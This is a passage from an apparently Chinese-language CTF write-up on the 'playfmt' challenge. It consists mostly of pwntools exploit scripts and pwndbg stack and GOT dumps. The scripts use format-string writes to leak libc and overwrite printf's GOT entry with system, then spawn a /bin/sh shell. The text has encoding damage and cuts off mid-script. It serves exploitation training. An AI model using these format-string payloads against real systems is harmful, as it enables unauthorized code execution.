"..%8$p....%6$p."...0x804a06f &lt;buf+15>:    ".11111111"0x804a079 &lt;buf+25>:    ""pwndbg> stack 2500:0000â”‚ esp  0xffa077c0 â€”â–¸ 0x804a060 (buf) â—‚â€” 0x38252e2e ('..%8')01:0004â”‚      0xffa077c4 â€”â–¸ 0x8048640 â—‚â€” jno    0x80486b7 /* 'quit' */02:0008â”‚      0xffa077c8 â—‚â€” 0x403:000câ”‚      0xffa077cc â€”â–¸ 0x804857c (play+51) â—‚â€” add    esp, 0x1004:0010â”‚      0xffa077d0 â€”â–¸ 0x8048645 â—‚â€” cmp    eax, 0x3d3d3d3d05:0014â”‚      0xffa077d4 â€”â–¸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db006:0018â”‚ ebp  0xffa077d8 â€”â–¸ 0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x007:001câ”‚      0xffa077dc â€”â–¸ 0x8048584 (play+59) â—‚â€” nop08:0020â”‚      0xffa077e0 â€”â–¸ 0xf7eb0d60 (_IO_2_1_stdout_) â—‚â€” 0xfbad288709:0024â”‚      0xffa077e4 â—‚â€” 0x00a:0028â”‚      0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x00b:002câ”‚      0xffa077ec â€”â–¸ 0x80485b1 (main+42) â—‚â€” nop0c:0030â”‚      0xffa077f0 â€”â–¸ 0xf7eb03dc (__exit_funcs) â€”â–¸ 0xf7eb11e0 (initial) â—‚â€” 0x00d:0034â”‚      0xffa077f4 â€”â–¸ 0xffa07810 â—‚â€” 0x10e:0038â”‚      0xffa077f8 â—‚â€” 0x00f:003câ”‚      0xffa077fc â€”â–¸ 0xf7d15276 (__libc_start_main+246) â—‚â€” add    esp, 0x1010:0040â”‚      0xffa07800 â—‚â€” 0x111:0044â”‚      0xffa07804 â€”â–¸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db012:0048â”‚      0xffa07808 â—‚â€” 0x013:004câ”‚      0xffa0780c â€”â–¸ 0xf7d15276 (__libc_start_main+246) â—‚â€” add    esp, 0x1014:0050â”‚      0xffa07810 â—‚â€” 0x115:0054â”‚      0xffa07814 â€”â–¸ 0xffa078a4 â€”â–¸ 0xffa083d6 â—‚â€” './playfmt'16:0058â”‚      0xffa07818 â€”â–¸ 0xffa078ac â€”â–¸ 0xffa083e0 â—‚â€” 'NO_AT_BRIDGE=1'17:005câ”‚      0xffa0781c â—‚â€” 0x0... â†“'''</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> <span class="token string">"b *do_fmt+64\nc"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"..%8$p....%6$p..11111111\0"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">"libc.address -> {:#x}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">)</span>stack <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x28</span>success<span class="token punctuation">(</span><span class="token string">"stack -> {:#x}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''pwndbg> x/3s 0x804a0600x804a060 &lt;buf>:    "%30684c%21$hn%1"...0x804a06f &lt;buf+15>:    "6c%22$hn2222222"...0x804a07e &lt;buf+30>:    "2"pwndbg> stack 2500:0000â”‚ esp  0xffa077c0 â€”â–¸ 0x804a060 (buf) â—‚â€” 0x36303325 ('%306')01:0004â”‚      0xffa077c4 â€”â–¸ 0x8048640 â—‚â€” jno    0x80486b7 /* 'quit' */02:0008â”‚      0xffa077c8 â—‚â€” 0x403:000câ”‚      0xffa077cc â€”â–¸ 0x804857c (play+51) â—‚â€” add    esp, 0x1004:0010â”‚      0xffa077d0 â€”â–¸ 0x8048645 â—‚â€” cmp    eax, 0x3d3d3d3d05:0014â”‚      0xffa077d4 â€”â–¸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db006:0018â”‚ ebp  0xffa077d8 â€”â–¸ 0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x007:001câ”‚      0xffa077dc â€”â–¸ 0x8048584 (play+59) â—‚â€” nop08:0020â”‚      0xffa077e0 â€”â–¸ 0xf7eb0d60 (_IO_2_1_stdout_) â—‚â€” 0xfbad288709:0024â”‚      0xffa077e4 â—‚â€” 0x00a:0028â”‚      0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x00b:002câ”‚      0xffa077ec â€”â–¸ 0x80485b1 (main+42) â—‚â€” nop0c:0030â”‚      0xffa077f0 â€”â–¸ 0xf7eb03dc (__exit_funcs) â€”â–¸ 0xf7eb11e0 (initial) â—‚â€” 0x00d:0034â”‚      0xffa077f4 â€”â–¸ 0xffa07810 â—‚â€” 0x10e:0038â”‚      0xffa077f8 â—‚â€” 0x00f:003câ”‚      0xffa077fc â€”â–¸ 0xf7d15276 (__libc_start_main+246) â—‚â€” add    esp, 0x1010:0040â”‚      0xffa07800 â—‚â€” 0x111:0044â”‚      0xffa07804 â€”â–¸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db012:0048â”‚      0xffa07808 â—‚â€” 0x013:004câ”‚      0xffa0780c â€”â–¸ 0xf7d15276 (__libc_start_main+246) â—‚â€” add    esp, 0x1014:0050â”‚      0xffa07810 â—‚â€” 0x115:0054â”‚      0xffa07814 â€”â–¸ 0xffa078a4 â€”â–¸ 0xffa083d6 â—‚â€” './playfmt'16:0058â”‚      0xffa07818 â€”â–¸ 0xffa078ac â€”â–¸ 0xffa083e0 â—‚â€” 'NO_AT_BRIDGE=1'17:005câ”‚      0xffa0781c â—‚â€” 0x0... â†“'''</span>payload <span class="token operator">=</span> <span class="token string">"%{}c%{}$hn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token punctuation">(</span>stack <span class="token operator">+</span> <span class="token number">0x1c</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#  payload += "%{}c%{}$hn".format((stack + 0x2c) &amp; 0xffff - (stack + 0x1c) &amp; 0xffff, 0x16)</span>payload <span class="token operator">+=</span> <span class="token string">"%{}c%{}$hn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'22222222\0'</span>info<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"11111111"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''pwndbg> x/3s 0x804a0600x804a060 &lt;buf>:    "%40976c%57$hn%2"...0x804a06f &lt;buf+15>:    "c%59$hn33333333"0x804a07e &lt;buf+30>:    ""pwndbg> stack 2500:0000â”‚ esp  0xffa077c0 â€”â–¸ 0x804a060 (buf) â—‚â€” 0x39303425 ('%409')01:0004â”‚      0xffa077c4 â€”â–¸ 0x8048640 â—‚â€” jno    0x80486b7 /* 'quit' */02:0008â”‚      0xffa077c8 â—‚â€” 0x403:000câ”‚      0xffa077cc â€”â–¸ 0x804857c (play+51) â—‚â€” add    esp, 0x1004:0010â”‚      0xffa077d0 â€”â–¸ 0x8048645 â—‚â€” cmp    eax, 0x3d3d3d3d05:0014â”‚      0xffa077d4 â€”â–¸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db006:0018â”‚ ebp  0xffa077d8 â€”â–¸ 0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x007:001câ”‚      0xffa077dc â€”â–¸ 0x8048584 (play+59) â—‚â€” nop08:0020â”‚      0xffa077e0 â€”â–¸ 0xf7eb0d60 (_IO_2_1_stdout_) â—‚â€” 0xfbad288709:0024â”‚      0xffa077e4 â—‚â€” 0x00a:0028â”‚      0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x00b:002câ”‚      0xffa077ec â€”â–¸ 0x80485b1 (main+42) â—‚â€” nop0c:0030â”‚      0xffa077f0 â€”â–¸ 0xf7eb03dc (__exit_funcs) â€”â–¸ 0xf7eb11e0 (initial) â—‚â€” 0x00d:0034â”‚      0xffa077f4 â€”â–¸ 0xffa07810 â—‚â€” 0x10e:0038â”‚      0xffa077f8 â—‚â€” 0x00f:003câ”‚      0xffa077fc â€”â–¸ 0xf7d15276 (__libc_start_main+246) â—‚â€” add    esp, 0x1010:0040â”‚      0xffa07800 â—‚â€” 0x111:0044â”‚      0xffa07804 â€”â–¸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db012:0048â”‚      0xffa07808 â—‚â€” 0x013:004câ”‚      0xffa0780c â€”â–¸ 0xf7d15276 (__libc_start_main+246) â—‚â€” add    esp, 0x1014:0050â”‚      0xffa07810 â—‚â€” 0x115:0054â”‚      0xffa07814 â€”â–¸ 0xffa078a4 â€”â–¸ 0xffa077dc â€”â–¸ 0x8048584 (play+59) â—‚â€” nop16:0058â”‚      0xffa07818 â€”â–¸ 0xffa078ac â€”â–¸ 0xffa077ec â€”â–¸ 0x80485b1 (main+42) â—‚â€” nop17:005câ”‚      0xffa0781c â—‚â€” 0x0... â†“'''</span><span class="token comment" spellcheck="true">#  gdb.attach(io, "b *do_fmt+64\nc")</span>payload <span class="token operator">=</span> <span class="token string">"%{}c%{}$hn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#  payload += "%{}c%{}$hn".format((elf.got['printf'] &amp; 0xffff + 2) - (elf.got['printf'] &amp; 0xffff), 0x3b)</span>payload <span class="token operator">+=</span> <span class="token string">"%{}c%{}$hn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x3b</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">"33333333\0"</span>info<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"22222222"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''pwndbg> x/3s 0x804a0600x804a060 &lt;buf>:    "%211c%11$hhn%31"...0x804a06f &lt;buf+15>:    "325c%7$hn444444"...0x804a07e &lt;buf+30>:    "44"pwndbg> stack 2500:0000â”‚ esp  0xffa077c0 â€”â–¸ 0x804a060 (buf) â—‚â€” 0x31313225 ('%211')01:0004â”‚      0xffa077c4 â€”â–¸ 0x8048640 â—‚â€” jno    0x80486b7 /* 'quit' */02:0008â”‚      0xffa077c8 â—‚â€” 0x403:000câ”‚      0xffa077cc â€”â–¸ 0x804857c (play+51) â—‚â€” add    esp, 0x1004:0010â”‚      0xffa077d0 â€”â–¸ 0x8048645 â—‚â€” cmp    eax, 0x3d3d3d3d05:0014â”‚      0xffa077d4 â€”â–¸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db006:0018â”‚ ebp  0xffa077d8 â€”â–¸ 0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x007:001câ”‚      0xffa077dc â€”â–¸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) â€”â–¸ 0xf7d46930 (printf) â—‚â€” call   0xf7e1dae908:0020â”‚      0xffa077e0 â€”â–¸ 0xf7eb0d60 (_IO_2_1_stdout_) â—‚â€” 0xfbad288709:0024â”‚      0xffa077e4 â—‚â€” 0x00a:0028â”‚      0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x00b:002câ”‚      0xffa077ec â€”â–¸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) â—‚â€” 0xc870f7d40c:0030â”‚      0xffa077f0 â€”â–¸ 0xf7eb03dc (__exit_funcs) â€”â–¸ 0xf7eb11e0 (initial) â—‚â€” 0x00d:0034â”‚      0xffa077f4 â€”â–¸ 0xffa07810 â—‚â€” 0x10e:0038â”‚      0xffa077f8 â—‚â€” 0x00f:003câ”‚      0xffa077fc â€”â–¸ 0xf7d15276 (__libc_start_main+246) â—‚â€” add    esp, 0x1010:0040â”‚      0xffa07800 â—‚â€” 0x111:0044â”‚      0xffa07804 â€”â–¸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db012:0048â”‚      0xffa07808 â—‚â€” 0x013:004câ”‚      0xffa0780c â€”â–¸ 0xf7d15276 (__libc_start_main+246) â—‚â€” add    esp, 0x1014:0050â”‚      0xffa07810 â—‚â€” 0x115:0054â”‚      0xffa07814 â€”â–¸ 0xffa078a4 â€”â–¸ 0xffa077dc â€”â–¸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) â—‚â€” 0xf7d4693016:0058â”‚      0xffa07818 â€”â–¸ 0xffa078ac â€”â–¸ 0xffa077ec â€”â–¸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) â—‚â€” 0xc870f7d417:005câ”‚      0xffa0781c â—‚â€” 0x0... â†“pwndbg> n0x08048540 in do_fmt ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATAâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ EAX  0x7b38 EBX  0x0 ECX  0xffa052a0 â—‚â€” 0x20202020 ('    ') EDX  0xf7eb1870 (_IO_stdfile_1_lock) â—‚â€” 0x0 EDI  0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db0 ESI  0x1 EBP  0xffa077d8 â€”â–¸ 0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x0 ESP  0xffa077c0 â€”â–¸ 0x804a060 (buf) â—‚â€” 0x31313225 ('%211') EIP  0x8048540 (do_fmt+69) â—‚â€” add    esp, 0x10â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€   0x804853b &lt;do_fmt+64>    call   printf@plt &lt;0x80483a0> â–º 0x8048540 &lt;do_fmt+69>    add    esp, 0x10   0x8048543 &lt;do_fmt+72>    jmp    do_fmt+6 &lt;0x8048501>    â†“   0x8048501 &lt;do_fmt+6>     sub    esp, 4   0x8048504 &lt;do_fmt+9>     push   0xc8   0x8048509 &lt;do_fmt+14>    push   buf &lt;0x804a060>   0x804850e &lt;do_fmt+19>    push   0   0x8048510 &lt;do_fmt+21>    call   read@plt &lt;0x8048390>   0x8048515 &lt;do_fmt+26>    add    esp, 0x10   0x8048518 &lt;do_fmt+29>    sub    esp, 4   0x804851b &lt;do_fmt+32>    push   4â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€00:0000â”‚ esp  0xffa077c0 â€”â–¸ 0x804a060 (buf) â—‚â€” 0x31313225 ('%211')01:0004â”‚      0xffa077c4 â€”â–¸ 0x8048640 â—‚â€” jno    0x80486b7 /* 'quit' */02:0008â”‚      0xffa077c8 â—‚â€” 0x403:000câ”‚      0xffa077cc â€”â–¸ 0x804857c (play+51) â—‚â€” add    esp, 0x1004:0010â”‚      0xffa077d0 â€”â–¸ 0x8048645 â—‚â€” cmp    eax, 0x3d3d3d3d05:0014â”‚      0xffa077d4 â€”â–¸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db006:0018â”‚ ebp  0xffa077d8 â€”â–¸ 0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x007:001câ”‚      0xffa077dc â€”â–¸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) â€”â–¸ 0xf7d37b30 (system) â—‚â€” sub    esp, 0xcâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â–º f 0  8048540 do_fmt+69   f 1  804a010 _GLOBAL_OFFSET_TABLE_+16   f 2 f7eb0d60 _IO_2_1_stdout_   f 3  804a012 _GLOBAL_OFFSET_TABLE_+18   f 4 f7eb03dc __exit_funcs   f 5 ffa07810   f 6 f7d15276 __libc_start_main+246pwndbg> stack 2500:0000â”‚ esp  0xffa077c0 â€”â–¸ 0x804a060 (buf) â—‚â€” 0x31313225 ('%211')01:0004â”‚      0xffa077c4 â€”â–¸ 0x8048640 â—‚â€” jno    0x80486b7 /* 'quit' */02:0008â”‚      0xffa077c8 â—‚â€” 0x403:000câ”‚      0xffa077cc â€”â–¸ 0x804857c (play+51) â—‚â€” add    esp, 0x1004:0010â”‚      0xffa077d0 â€”â–¸ 0x8048645 â—‚â€” cmp    eax, 0x3d3d3d3d05:0014â”‚      0xffa077d4 â€”â–¸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db006:0018â”‚ ebp  0xffa077d8 â€”â–¸ 0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x007:001câ”‚      0xffa077dc â€”â–¸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) â€”â–¸ 0xf7d37b30 (system) â—‚â€” sub    esp, 0xc08:0020â”‚      0xffa077e0 â€”â–¸ 0xf7eb0d60 (_IO_2_1_stdout_) â—‚â€” 0xfbad288709:0024â”‚      0xffa077e4 â—‚â€” 0x00a:0028â”‚      0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x00b:002câ”‚      0xffa077ec â€”â–¸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) â—‚â€” 0xc870f7d30c:0030â”‚      0xffa077f0 â€”â–¸ 0xf7eb03dc (__exit_funcs) â€”â–¸ 0xf7eb11e0 (initial) â—‚â€” 0x00d:0034â”‚      0xffa077f4 â€”â–¸ 0xffa07810 â—‚â€” 0x10e:0038â”‚      0xffa077f8 â—‚â€” 0x00f:003câ”‚      0xffa077fc â€”â–¸ 0xf7d15276 (__libc_start_main+246) â—‚â€” add    esp, 0x1010:0040â”‚      0xffa07800 â—‚â€” 0x111:0044â”‚      0xffa07804 â€”â–¸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db012:0048â”‚      0xffa07808 â—‚â€” 0x013:004câ”‚      0xffa0780c â€”â–¸ 0xf7d15276 (__libc_start_main+246) â—‚â€” add    esp, 0x1014:0050â”‚      0xffa07810 â—‚â€” 0x115:0054â”‚      0xffa07814 â€”â–¸ 0xffa078a4 â€”â–¸ 0xffa077dc â€”â–¸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) â—‚â€” 0xf7d37b3016:0058â”‚      0xffa07818 â€”â–¸ 0xffa078ac â€”â–¸ 0xffa077ec â€”â–¸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) â—‚â€” 0xc870f7d317:005câ”‚      0xffa0781c â—‚â€” 0x0... â†“pwndbg> gotGOT protection: Partial RELRO | GOT functions: 6[0x804a00c] read@GLIBC_2.0 -> 0xf7dd3c50 (read) â—‚â€” cmp    dword ptr gs:[0xc], 0[0x804a010] printf@GLIBC_2.0 -> 0xf7d37b30 (system) â—‚â€” sub    esp, 0xc[0x804a014] puts@GLIBC_2.0 -> 0xf7d5c870 (puts) â—‚â€” push   ebp[0x804a018] __libc_start_main@GLIBC_2.0 -> 0xf7d15180 (__libc_start_main) â—‚â€” push   ebp[0x804a01c] setvbuf@GLIBC_2.0 -> 0xf7d5cff0 (setvbuf) â—‚â€” push   ebp[0x804a020] strncmp@GLIBC_2.0 -> 0xf7e3a5d0 (__strncmp_sse4_2) â—‚â€” push   ebp'''</span><span class="token comment" spellcheck="true">#  gdb.attach(io, "b *do_fmt+64\nc")</span>payload <span class="token operator">=</span> <span class="token string">"%{}c%{}$hhn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">16</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">0xb</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">"%{}c%{}$hn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">16</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x7</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'44444444\0'</span>info<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"33333333"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"44444444"</span><span class="token punctuation">,</span> <span class="token string">"/bin/sh\0"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true">#ä½œè€…ï¼š23R3F</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./playfmt'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./playfmt'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/i386-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>printf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>system_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>  printf_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>  p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"**********leak printf_got************"</span><span class="token punctuation">)</span> payload <span class="token operator">=</span> <span class="token string">'%6$x'</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>ebp2 <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>ebp1 <span class="token operator">=</span> ebp2 <span class="token operator">-</span> <span class="token number">0x10</span>fmt_7 <span class="token operator">=</span> ebp2 <span class="token operator">-</span><span class="token number">0x0c</span>fmt_11 <span class="token operator">=</span> ebp2 <span class="token operator">+</span> <span class="token number">0x04</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"printf_got-->p[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>printf_got<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"ebp_1-->p[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>ebp1<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"ebp_2-->p[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>ebp2<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"fmt_7-->p[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>fmt_7<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"fmt_11-->p[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>fmt_11<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fmt_7 <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%6$hn'</span><span class="token comment" spellcheck="true">#ebp2 = fmt_7</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#ç”±äºebp2å·²ç»æŒ‡å‘äº†fmt_7ï¼Œæ‰€ä»¥ä¿®æ”¹åç§»é‡10å¤„çš„ebp2å³ä¿®æ”¹fmt_7</span>payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>printf_got <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%10$hn'</span><span class="token comment" spellcheck="true">#fmt_7 = prinf_got</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token triple-quoted-string string">'''è¿™ä¸ªå¾ªç¯ç”¨äºä¿è¯æ‰€æœ‰çš„å­—èŠ‚éƒ½è¢«è¾“å‡ºï¼Œå› 